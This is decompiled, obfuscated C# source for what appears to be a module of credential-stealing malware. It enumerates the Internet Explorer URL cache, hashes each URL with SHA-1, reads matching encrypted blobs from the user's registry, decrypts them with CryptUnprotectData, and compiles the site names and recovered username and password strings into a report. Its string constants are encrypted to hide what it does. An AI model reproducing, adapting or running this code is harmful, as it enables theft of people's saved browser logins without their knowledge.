using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns1;

internal sealed class Class17
{
	public struct Struct5
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;
	}

	public struct Struct6
	{
		public int int_0;

		public FILETIME filetime_0;

		public int int_1;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	public struct Struct7
	{
		public int int_0;

		[MarshalAs(UnmanagedType.LPTStr)]
		public string string_0;

		[MarshalAs(UnmanagedType.LPTStr)]
		public string string_1;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public FILETIME filetime_0;

		public FILETIME filetime_1;

		public FILETIME filetime_2;

		public FILETIME filetime_3;

		public IntPtr intptr_0;

		public int int_6;

		public IntPtr intptr_1;

		public int int_7;
	}

	private struct Struct8
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	public static string string_0;

	public static readonly uint uint_0 = 32771u;

	public static readonly uint uint_1 = 26113u;

	public static readonly uint uint_2 = 26114u;

	public static readonly uint uint_3 = 26625u;

	public static string string_1 = Class9.smethod_0("dq2vxLmEsK6sj4yhu7+1kqS9rIuRsq7CsIiyaZW6k6q4wqeVmpK+toiqtbmIkrC2w552srjCo4qjeyY=", "False");

	public static string string_2 = "";

	[DllImport("advapi32.dll")]
	public static extern bool CryptAcquireContext(ref IntPtr intptr_0, string string_3, string string_4, uint uint_4, uint uint_5);

	[DllImport("advapi32.dll", SetLastError = true)]
	internal static extern bool CryptGetHashParam(IntPtr intptr_0, int int_0, byte[] byte_0, ref int int_1, int int_2);

	[DllImport("advapi32.dll")]
	public static extern bool CryptReleaseContext(IntPtr intptr_0, uint uint_4);

	[DllImport("advapi32.dll")]
	public static extern bool CryptCreateHash(IntPtr intptr_0, uint uint_4, IntPtr intptr_1, uint uint_5, ref IntPtr intptr_2);

	[DllImport("advapi32.dll")]
	public static extern bool CryptHashData(IntPtr intptr_0, IntPtr intptr_1, int int_0, uint uint_4);

	[DllImport("advapi32.dll")]
	public static extern bool CryptDestroyHash(IntPtr intptr_0);

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr FindFirstUrlCacheEntry([MarshalAs(UnmanagedType.LPTStr)] string string_3, IntPtr intptr_0, ref int int_0);

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool FindNextUrlCacheEntry(IntPtr intptr_0, IntPtr intptr_1, ref int int_0);

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Struct8 struct8_0, int int_0, ref Struct8 struct8_1, int int_1, int int_2, int int_3, ref Struct8 struct8_2);

	public static void smethod_0()
	{
		object obj = Registry.CurrentUser.OpenSubKey(string_1, writable: true);
		if (obj == null)
		{
			string_0 = Class9.smethod_0("g56psKKDnqmwooOeqbCig56psKKDnqmwomaq2ufKuM/R54WL2dzf1LjG3pOig56psKKDnqmwooOeqbCig56psKKDnqmwBA==", "False") + "\r\n\r\n" + Class9.smethod_0("hLi2vrqUasnLboGvuMvElLwZ", "False") + "\r\n\r\n" + Class9.smethod_0("Yn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn0j", "False");
			return;
		}
		int num = 2;
		int int_ = 0;
		FindFirstUrlCacheEntry(null, IntPtr.Zero, ref int_);
		if (Marshal.GetLastWin32Error() == 259)
		{
			return;
		}
		int num2 = int_;
		IntPtr intPtr = Marshal.AllocHGlobal(num2);
		try
		{
			IntPtr intptr_ = FindFirstUrlCacheEntry(null, intPtr, ref int_);
			bool flag;
			do
			{
				Struct7 @struct = (Struct7)Marshal.PtrToStructure(intPtr, typeof(Struct7));
				string text = @struct.string_0;
				text = text.ToLower();
				text = text.Substring(text.IndexOf(Class9.smethod_0("WS4=", "False")) + 1);
				if (text.IndexOf(Class9.smethod_0("cBY=", "False")) > 0)
				{
					text = text.Substring(0, text.IndexOf(Class9.smethod_0("cBY=", "False")));
				}
				string text2 = smethod_1(text, (text.Length + 1) * 2);
				try
				{
					byte[] array = (byte[])Registry.CurrentUser.OpenSubKey(string_1)!.GetValue(text2, null);
					if (array != null)
					{
						if (!string_2.Contains(text))
						{
							smethod_3(text, text2, array.Length, array);
							string_2 = string_2 + text + Class9.smethod_0("VhE=", "False");
						}
					}
					else
					{
						text += Class9.smethod_0("Xhg=", "False");
						string text3 = smethod_1(text, (text.Length + 1) * 2);
						byte[] array2 = (byte[])Registry.CurrentUser.OpenSubKey(string_1)!.GetValue(text3, null);
						if (array2 != null && !string_2.Contains(text))
						{
							smethod_3(text, text3, array2.Length, array2);
							string_2 = string_2 + text + " ";
						}
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex, num);
					string_0 = Class9.smethod_0("g56psKKDnqmwooOeqbCig56psKKDnqmwomaq2ufKuM/R54WL2dzf1LjG3pOig56psKKDnqmwooOeqbCig56psKKDnqmwBA==", "False") + "\r\n\r\n" + Class9.smethod_0("hLi2vrqUasnLboGvuMvElLwZ", "False") + "\r\n\r\n" + Class9.smethod_0("Yn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn0j", "False");
					ProjectData.ClearProjectError();
					break;
				}
				int_ = num2;
				if (((flag = FindNextUrlCacheEntry(intptr_, intPtr, ref int_)) || Marshal.GetLastWin32Error() != 259) && !flag && int_ > num2)
				{
					num2 = int_;
					IntPtr cb = new IntPtr(num2);
					intPtr = Marshal.ReAllocHGlobal(intPtr, cb);
					flag = true;
				}
			}
			while (flag);
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static string smethod_1(string string_3, int int_0)
	{
		string result = default(string);
		try
		{
			byte[] array = new byte[21];
			string text = "";
			int int_ = 20;
			IntPtr intptr_ = default(IntPtr);
			CryptAcquireContext(ref intptr_, null, null, 1u, 0u);
			IntPtr intptr_2 = default(IntPtr);
			CryptCreateHash(intptr_, 32772u, IntPtr.Zero, 0u, ref intptr_2);
			CryptHashData(intptr_2, smethod_4(string_3), int_0, 0u);
			CryptGetHashParam(intptr_2, 2, array, ref int_, 0);
			CryptDestroyHash(intptr_2);
			CryptReleaseContext(intptr_, 0u);
			int location = 0;
			while (location < 20)
			{
				text += Strings.Right(Class9.smethod_0("WHMg", "False") + array[location].ToString(Class9.smethod_0("kA8=", "False")), 2);
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
			text += Strings.Right(Class9.smethod_0("WHMg", "False") + smethod_2(text).ToString(Class9.smethod_0("kA8=", "False")), 2);
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static byte smethod_2(string string_3)
	{
		byte result = default(byte);
		try
		{
			int num = 0;
			int location = 1;
			while (location < string_3.Length)
			{
				if (location % 2 != 0)
				{
					num += Convert.ToInt32(Conversion.Val(Class9.smethod_0("UY4d", "False") + Strings.Mid(string_3, location, 2)));
				}
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
			byte b = Convert.ToByte(num % 256);
			result = b;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_3(string string_3, string string_4, int int_0, byte[] byte_0)
	{
		Struct8 struct8_ = default(Struct8);
		Struct8 struct8_2 = default(Struct8);
		Struct8 struct8_3 = default(Struct8);
		Struct5 @struct = default(Struct5);
		Struct6 struct2 = default(Struct6);
		IntPtr intPtr = Marshal.AllocHGlobal(int_0);
		try
		{
			Marshal.Copy(byte_0, 0, intPtr, int_0);
			struct8_.int_0 = int_0;
			struct8_.intptr_0 = intPtr;
			struct8_3.int_0 = (string_3.Length + 1) * 2;
			struct8_3.intptr_0 = smethod_4(string_3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!CryptUnprotectData(ref struct8_, 0, ref struct8_3, 0, 0, 0, ref struct8_2))
			{
				return;
			}
			IntPtr ptr = new IntPtr(struct8_2.intptr_0.ToInt32() + Marshal.ReadByte(struct8_2.intptr_0));
			@struct = (Struct5)Marshal.PtrToStructure(ptr, @struct.GetType());
			if (@struct.int_4 != 1 || @struct.int_2 < 2)
			{
				return;
			}
			IntPtr ptr2 = new IntPtr(ptr.ToInt32() + @struct.int_1);
			IntPtr intPtr2 = new IntPtr(ptr2.ToInt32() + (@struct.int_2 + 0) * Marshal.SizeOf((object)struct2));
			int location = 0;
			string_0 = string_0 + Class9.smethod_0("dZCbopR1kJuilHWQp9PLncXMystYmNbVw6fFw9eUdZCbopR1kJuilHWQmxE=", "False") + "\r\n\r\n";
			while ((double)location < (double)@struct.int_2 / 2.0)
			{
				if (location != 0)
				{
					ptr2 = new IntPtr(ptr2.ToInt32() + Marshal.SizeOf((object)struct2));
				}
				struct2 = (Struct6)Marshal.PtrToStructure(ptr2, struct2.GetType());
				IntPtr ptr3 = new IntPtr(intPtr2.ToInt32() + struct2.int_0);
				string text = Marshal.PtrToStringAuto(ptr3);
				ptr2 = new IntPtr(ptr2.ToInt32() + Marshal.SizeOf((object)struct2));
				struct2 = (Struct6)Marshal.PtrToStructure(ptr2, struct2.GetType());
				ptr3 = new IntPtr(intPtr2.ToInt32() + struct2.int_0);
				string text2 = Marshal.PtrToStringAuto(ptr3);
				string_0 = string_0 + Class9.smethod_0("i6OonXUQ", "False") + string_3 + "\r\n";
				string_0 = string_0 + Class9.smethod_0("b6iluad7oqWBWSw=", "False") + text + "\r\n";
				string_0 = string_0 + Class9.smethod_0("gKzJ0MafvbqXbxY=", "False") + text2 + "\r\n";
				string_0 += "\r\n";
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
			string_0 += Class9.smethod_0("fJeiqZt8l6Kpm3yXoqmbfJeiqZt8l6Kpm3yXoqmbfJcJ", "False");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static IntPtr smethod_4(object object_0)
	{
		IntPtr result = default(IntPtr);
		try
		{
			result = GCHandle.Alloc(RuntimeHelpers.GetObjectValue(object_0), GCHandleType.Pinned).AddrOfPinnedObject();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_5(string string_3, int int_0, int int_1)
	{
		string result = default(string);
		try
		{
			string text = string_3.Substring(int_0, int_1);
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
